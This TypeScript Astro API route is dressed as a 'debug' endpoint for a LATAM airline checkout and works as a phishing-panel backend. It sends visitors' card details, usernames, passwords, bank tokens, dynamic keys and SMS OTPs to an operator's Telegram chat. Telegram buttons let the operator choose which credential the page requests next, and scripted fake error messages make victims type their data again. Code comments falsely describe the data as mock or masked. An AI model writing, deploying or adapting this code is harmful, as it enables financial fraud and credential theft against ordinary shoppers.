export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved' | 'userpass' | 'userpass_error' | 'token' | 'token_error' | 'dynamic' | 'dynamic_error';

type RouteDecision = {
  action: RouteAction;
  brand?: string;
  message?: string;
  updatedAt?: string;
  sessionId?: string;
};

type DebugSession = {
  decision?: RouteDecision;
  steps: Set<string>;
  payload?: Record<string, unknown>;
};

const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';

const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
  '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
  '4': { brand: 'visa', pan: '4111111111111111', exp: '12/30', cvv: '123', holder: 'QA VISA MOCK' },
  '5': { brand: 'mastercard', pan: '5555555555554444', exp: '12/30', cvv: '123', holder: 'QA MC MOCK' },
  '6': { brand: 'discover', pan: '6011111111111117', exp: '12/30', cvv: '123', holder: 'QA DISCOVER MOCK' },
};

// Estado efimero por instancia serverless/dev: guarda la decision elegida en Telegram
// los pasos ya pedidos y el ultimo payload recibido por sessionId.
const globals = globalThis as typeof globalThis & {
  __latamDebugSessions?: Map<string, DebugSession>;
  __latamDebugTelegramOffset?: number;
  __latamLastDecision?: RouteDecision;
  __latamWebhookCleared?: boolean;
  __latamSyncing?: boolean;
};
const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
globals.__latamDebugSessions = sessions;

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function cleanSessionId(value: unknown) {
  const id = String(value || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 80);
  return id || crypto.randomUUID();
}

function cardMockForFirstDigit(value: unknown) {
  const first = String(value || '').replace(/\D/g, '').charAt(0);
  return CARD_MOCKS[first] || CARD_MOCKS['4'];
}

// Lee secretos solo desde backend. Estos valores no se importan en scripts de navegador.
function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

function getSession(sessionId: string) {
  const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
  sessions.set(sessionId, session);
  return session;
}

function objectValue(value: unknown) {
  return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
}

function rememberStep(sessionId: string, step: string) {
  getSession(sessionId).steps.add(step);
}

function hasStep(sessionId: string, step: string) {
  return getSession(sessionId).steps.has(step);
}

// Traduce un boton de Telegram en una decision consumible por el frontend.
// Tambien aplica reglas de repeticion para tarjeta/SMS dentro de la misma sesion.
function makeDecision(sessionId: string, action: RouteAction, brand?: string): RouteDecision {
  if (action === 'card') {
    if (hasStep(sessionId, 'card')) {
      getSession(sessionId).steps = new Set(['card']);
      return {
        action: 'card_error',
        brand,
        message: 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'card');
  }

  if (action === 'sms') {
    if (hasStep(sessionId, 'sms')) {
      return {
        action: 'sms_error',
        brand,
        message: SMS_INVALID_MESSAGE,
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'sms');
  }

  if (action === 'userpass') {
    if (hasStep(sessionId, 'userpass')) {
      return {
        action: 'userpass_error',
        brand,
        message: 'Usuario o contraseña incorrectos. Intenta nuevamente.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'userpass');
  }

  if (action === 'token') {
    if (hasStep(sessionId, 'token')) {
      return {
        action: 'token_error',
        brand,
        message: 'Token inválido. Genera uno nuevo e inténtalo otra vez.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'token');
  }

  if (action === 'dynamic') {
    if (hasStep(sessionId, 'dynamic')) {
      return {
        action: 'dynamic_error',
        brand,
        message: 'Clave dinámica inválida. Genera una nueva e inténtalo otra vez.',
        updatedAt: new Date().toISOString(),
      };
    }
    rememberStep(sessionId, 'dynamic');
  }

  return { action, brand, updatedAt: new Date().toISOString() };
}

function actionLabel(action: RouteAction) {
  const labels: Record<RouteAction, string> = {
    wait: 'Esperando operador',
    sms: 'Enviar a SMS',
    card: 'Pedir tarjeta',
    sms_error: 'Error SMS repetido',
    card_error: 'Error tarjeta repetida',
    approved: 'Aprobado mock',
    userpass: 'Pedir usuario y contraseña',
    userpass_error: 'Error usuario/contraseña',
    token: 'Pedir token',
    token_error: 'Error token',
    dynamic: 'Pedir clave dinámica',
    dynamic_error: 'Error clave dinámica',
  };
  return labels[action] || action;
}

function isProcessingEvent(event: unknown) {
  return event === 'PAYMENT_SUBMIT'
    || event === 'OTP_SUBMIT'
    || event === 'USERPASS_SUBMIT'
    || event === 'TOKEN_SUBMIT'
    || event === 'DYNAMIC_SUBMIT';
}

function stepLabel(event: unknown, meta?: Record<string, unknown>) {
  if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
  const labels: Record<string, string> = {
    P1: 'Inicio / reserva',
    P2: 'Eligiendo vuelos',
    P3: 'Resumen del viaje',
    P4: 'Datos de pasajeros',
    'P-PAYMENT': 'Página de pago',
    'P-SUCCESS': 'Compra confirmada',
    PAYMENT_SUBMIT: 'Pago en proceso',
    OTP_SUBMIT: 'Envió código OTP',
    USERPASS_SUBMIT: 'Envió usuario y contraseña',
    TOKEN_SUBMIT: 'Envió token',
    DYNAMIC_SUBMIT: 'Envió clave dinámica',
  };
  return labels[String(event || '')] || String(event || '-');
}

const ROUTE_ACTIONS = new Set<RouteAction>(['sms', 'card', 'approved', 'userpass', 'token', 'dynamic']);

function keyboard(sessionId: string, brand: string, origin = '') {
  const shortBrand = String(brand || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
  const publicOrigin = origin && !isLocalOrigin(origin) ? origin.replace(/\/$/, '') : '';
  const btn = (text: string, action: RouteAction) => {
    if (publicOrigin) {
      const href = `${publicOrigin}/api/debug?sessionId=${encodeURIComponent(sessionId)}&decision=${action}&brand=${encodeURIComponent(shortBrand)}`;
      return { text, url: href };
    }
    return { text, callback_data: `r:${sessionId}:${action}:${shortBrand}`.slice(0, 64) };
  };
  return {
    inline_keyboard: [
      [btn('User-Pass', 'userpass'), btn('Token', 'token')],
      [btn('C. dinámica', 'dynamic'), btn('Pedir SMS', 'sms')],
      [btn('Pedir Tarjeta', 'card')],
      [btn('Finalizar', 'approved')],
    ],
  };
}

function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, unknown>) {
  const labeled = meta.amountLabel ?? payload.amountLabel;
  if (typeof labeled === 'string' && labeled.trim()) return labeled.trim();
  const raw = meta.amount ?? payload.amount;
  const n = Number(raw);
  if (Number.isFinite(n) && String(raw) !== '') {
    return `USD ${n.toFixed(2).replace('.', ',')}`;
  }
  return '-';
}

function formatStepMessage(payload: Record<string, unknown>) {
  const meta = objectValue(payload.meta) || {};
  return stepLabel(payload.event, meta);
}

function formatPaymentMessage(payload: Record<string, unknown>) {
  const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
  const meta = objectValue(payload.meta) || {};
  const metaOtp = objectValue(payload.metaOtp) || {};
  const stepMeta = payload.event === 'OTP_SUBMIT' ? { ...meta, ...metaOtp } : meta;
  const cpayload = objectValue(meta.cpayload) || {};
  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
  return [
    '✈️ LATAM PANEL',
    '━━━━━━━━━━━━━━━━━━',
    `📍 ${stepLabel(payload.event, stepMeta)}`,
    `🆔 Sesión: ${payload.sessionId || '-'}`,
    `💵 Monto: ${formatPenAmount(meta, payload)}`,
    '',
    '💳 DATOS DE PAGO',
    `🏷️ Marca: ${brand.toUpperCase()}`,
    `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
    `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
    `👤 Titular: ${cpayload.holder || '-'}`,
    '',
    '👤 CREDENCIALES',
    `👤 Usuario: ${meta.username || '-'}`,
    `🔑 Contraseña: ${meta.password || '-'}`,
    `🎟️ Token: ${meta.token || '-'}`,
    `🔐 C-DIN: ${meta.cdin || '-'}`,
    '',
    '💰 OTP',
    `💵 Código: ${metaOtp.otp || '-'}`,
    '━━━━━━━━━━━━━━━━━━',
  ].join('\n');
}

function formatTelegramMessage(payload: Record<string, unknown>) {
  return isProcessingEvent(payload.event) ? formatPaymentMessage(payload) : formatStepMessage(payload);
}

// Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
async function telegramApi(method: string, payload: Record<string, unknown> = {}) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, result: null as unknown };
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  let body: Record<string, unknown> | null = null;
  try {
    body = await response.json() as Record<string, unknown>;
  } catch {
    body = null;
  }
  return {
    ok: Boolean(body?.ok ?? response.ok),
    status: response.status,
    result: body?.result ?? null,
  };
}

function packDecision(sessionId: string, decision: RouteDecision) {
  return `${sessionId}|${decision.action}|${decision.brand || ''}|${decision.updatedAt || Date.now()}`.slice(0, 512);
}

function unpackDecision(value: unknown, sessionId: string): RouteDecision | undefined {
  const text = String(value || '').trim();
  if (!text) return undefined;
  const parts = text.includes('|') ? text.split('|') : text.split('::');
  const sid = parts[0];
  const action = parts[1];
  const brand = parts[2] || undefined;
  if (!sid || sid !== sessionId || !action) return undefined;
  return {
    action: action as RouteAction,
    brand: brand || undefined,
    sessionId: sid,
    updatedAt: parts[3] || new Date().toISOString(),
  };
}

async function persistDecision(sessionId: string, decision: RouteDecision) {
  const stored = { ...decision, sessionId, updatedAt: decision.updatedAt || new Date().toISOString() };
  getSession(sessionId).decision = stored;
  globals.__latamLastDecision = stored;
  const packed = packDecision(sessionId, stored);
  try {
    await telegramApi('setMyDescription', { description: packed });
    await telegramApi('setMyShortDescription', { short_description: packed.slice(0, 120) });
  } catch {
    /* Shared Telegram store is best-effort. */
  }
}

function descriptionText(result: unknown, key: 'description' | 'short_description') {
  if (!result || typeof result !== 'object') return '';
  const row = result as Record<string, unknown>;
  return String(row[key] || '');
}

async function readPersistedDecision(sessionId: string): Promise<RouteDecision | undefined> {
  try {
    const description = await telegramApi('getMyDescription');
    const packed = unpackDecision(descriptionText(description.result, 'description'), sessionId);
    if (packed) return packed;
    const short = await telegramApi('getMyShortDescription');
    return unpackDecision(descriptionText(short.result, 'short_description'), sessionId);
  } catch {
    return undefined;
  }
}

function pickDecision(sessionId: string, persisted?: RouteDecision): RouteDecision {
  const sessionDecision = getSession(sessionId).decision;
  const last = globals.__latamLastDecision;
  if (sessionDecision?.action && sessionDecision.action !== 'wait') return sessionDecision;
  if (persisted?.action && persisted.action !== 'wait') return persisted;
  if (last?.sessionId === sessionId && last.action && last.action !== 'wait') return last;
  return sessionDecision || persisted || { action: 'wait' };
}

function isLocalOrigin(origin: string) {
  return /localhost|127\.0\.0\.1/i.test(origin);
}

function operatorHtml(decision: RouteDecision) {
  return `<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Pico y Placa Solidario</title>
  <style>
    body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; background:#00271c; color:#fff; font-family:Montserrat,Gotham,sans-serif; }
    main { text-align:center; padding:32px; }
    h1 { margin:0 0 8px; font-size:22px; }
    p { margin:0; color:#88f456; }
  </style>
</head>
<body>
  <main>
    <h1>Decisión registrada</h1>
    <p>${actionLabel(decision.action)}</p>
  </main>
</body>
</html>`;
}

async function ensurePollingMode() {
  if (globals.__latamWebhookCleared) return;
  const result = await telegramApi('deleteWebhook', { drop_pending_updates: false });
  if (result.ok || result.skipped) globals.__latamWebhookCleared = true;
}

async function telegramGetUpdates() {
  const payload: Record<string, unknown> = {
    timeout: 0,
    allowed_updates: ['callback_query'],
  };
  if (typeof globals.__latamDebugTelegramOffset === 'number') {
    payload.offset = globals.__latamDebugTelegramOffset;
  }
  const response = await telegramApi('getUpdates', payload);
  if (!response.ok) return [];
  return Array.isArray(response.result) ? response.result as Array<Record<string, unknown>> : [];
}

async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean; origin?: string } = {}) {
  const { chatId } = telegramConfig();
  if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const sessionId = String(payload.sessionId || '');
  const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
  const message: Record<string, unknown> = {
    chat_id: chatId,
    text: formatTelegramMessage(payload),
    disable_web_page_preview: true,
  };
  if (options.withButtons) {
    message.reply_markup = keyboard(sessionId, brand, options.origin || '');
  }
  const result = await telegramApi('sendMessage', message);
  return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
}

// Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
// Al usarse un boton, quita el teclado inline para evitar decisiones duplicadas.
async function handleTelegramCallback(body: Record<string, unknown>) {
  const callback = body.callback_query as Record<string, unknown> | undefined;
  const data = String(callback?.data || '');
  const match = data.match(/^(?:route|r):([^:]+):(sms|card|approved|userpass|token|dynamic)(?::([^:]+))?$/);
  if (!match) return json({ ok: true, ignored: true });

  const [, rawSessionId, rawAction, rawBrand] = match;
  const sessionId = cleanSessionId(rawSessionId);
  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand);
  await persistDecision(sessionId, decision);

  const message = callback?.message as Record<string, unknown> | undefined;
  if (message?.chat && typeof message.message_id === 'number') {
    const chat = message.chat as Record<string, unknown>;
    await telegramApi('editMessageReplyMarkup', {
      chat_id: chat.id,
      message_id: message.message_id,
      reply_markup: { inline_keyboard: [] },
    });
  }

  if (callback?.id) {
    await telegramApi('answerCallbackQuery', {
      callback_query_id: callback.id,
      text: actionLabel(decision.action),
      show_alert: false,
    });
  }

  return json({ ok: true, sessionId, decision });
}

// Sincroniza callbacks pendientes antes de responder al polling del navegador.
async function syncTelegramCallbacks() {
  if (globals.__latamSyncing) return;
  globals.__latamSyncing = true;
  try {
    const updates = await telegramGetUpdates();
    for (const update of updates) {
      if (typeof update?.update_id === 'number') {
        globals.__latamDebugTelegramOffset = update.update_id + 1;
      }
      if (update?.callback_query) {
        await handleTelegramCallback({ callback_query: update.callback_query });
      }
    }
  } finally {
    globals.__latamSyncing = false;
  }
}

// El frontend consulta este endpoint mientras muestra loader, esperando la decision
// que el operador eligio en Telegram para esta sessionId.
export const GET: APIRoute = async ({ url }) => {
  const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
  const requested = String(url.searchParams.get('decision') || '').toLowerCase() as RouteAction;
  const brand = String(url.searchParams.get('brand') || 'visa').replace(/[^a-z0-9]/gi, '').slice(0, 10) || 'visa';
  if (ROUTE_ACTIONS.has(requested)) {
    const decision = makeDecision(sessionId, requested, brand);
    await persistDecision(sessionId, decision);
    return new Response(operatorHtml(decision), {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
      },
    });
  }
  try {
    await ensurePollingMode();
    await syncTelegramCallbacks();
  } catch {
    /* Telegram polling is best-effort. */
  }
  const persisted = await readPersistedDecision(sessionId);
  return json({ sessionId, decision: pickDecision(sessionId, persisted) });
};

// Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
// el cliente envia datos mock/enmascarados y este endpoint arma el mensaje operativo.
export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  const callback = body.callback_query
    || (objectValue(body.update)?.callback_query as Record<string, unknown> | undefined);
  if (callback) return handleTelegramCallback({ callback_query: callback });

  console.info('[debug-api:body]', body);

  const event = String(body.event || '') as DebugEvent;
  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT', 'USERPASS_SUBMIT', 'TOKEN_SUBMIT', 'DYNAMIC_SUBMIT']);
  if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });

  const sessionId = cleanSessionId(body.sessionId);
  const origin = new URL(request.url).origin;
  try {
    await ensurePollingMode();
  } catch {
    /* Polling mode is best-effort. */
  }
  const session = getSession(sessionId);
  const previousPayload = session.payload;
  const previousMeta = objectValue(previousPayload?.meta);
  const previousMetaOtp = objectValue(previousPayload?.metaOtp);
  const incomingMeta = objectValue(body.meta);
  const incomingMetaOtp = objectValue(body.metaOtp);
  const mockCard = event === 'PAYMENT_SUBMIT' ? cardMockForFirstDigit(body.cardFirstDigit) : undefined;
  const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
  if (event === 'PAYMENT_SUBMIT') {
    rememberStep(sessionId, 'card');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'OTP_SUBMIT') {
    rememberStep(sessionId, 'sms');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'USERPASS_SUBMIT') {
    rememberStep(sessionId, 'userpass');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'TOKEN_SUBMIT') {
    rememberStep(sessionId, 'token');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }
  if (event === 'DYNAMIC_SUBMIT') {
    rememberStep(sessionId, 'dynamic');
    await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
  }

  const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
  const payload = {
    sessionId,
    event,
    route: String(body.route || ''),
    createdAt: new Date().toISOString(),
    brand,
    amount: meta.amount ?? previousMeta?.amount,
    amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
    meta,
    metaOtp: incomingMetaOtp || previousMetaOtp || {},
    action: isProcessingEvent(event) ? 'wait' : 'ack',
    mockCard,
  };

  console.info('[debug-api]', payload);
  session.payload = payload;
  const telegram = event === 'P-SUCCESS'
    ? { sent: false, skipped: 'success-page' }
    : await sendTelegram(payload, { withButtons: isProcessingEvent(event), origin });

  return json({ ...payload, telegram });
};
